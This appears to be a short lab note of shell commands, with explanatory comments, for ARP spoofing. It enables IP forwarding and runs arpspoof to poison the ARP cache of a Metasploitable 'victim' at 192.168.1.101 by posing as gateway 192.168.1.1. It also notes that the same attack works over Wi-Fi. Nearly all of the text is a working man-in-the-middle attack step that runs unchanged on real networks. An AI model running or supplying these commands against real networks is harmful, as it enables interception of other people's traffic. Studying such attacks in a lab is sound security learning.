# Tab-2
sudo -i
echo 1 > /proc/sys/net/ipv4/ip_forward # permission to forward packets on behalf of other machines
arpspoof -i eth0 -t 192.168.1.101 192.168.1.1 # generate several fake arp responses
# -i -> interface, since I work with virtual machines, they are connected via the eth0 (ethernet) interface, but arpspoof also supports Wi-Fi spoofing, only instead of eth0 you need to register wlan
# -t -> after -t we enter the IP addresses
# in the output we can see the MAC-adress of kali, the MAC-adress of the "victim" metasploitable, the type field indicating the packet transmission interface, the total number of bytes in eth0 and a summary of the fake arp response
# you just need to run and wait a little to generate arp responses to ensure the constant presence of false information in the arp table

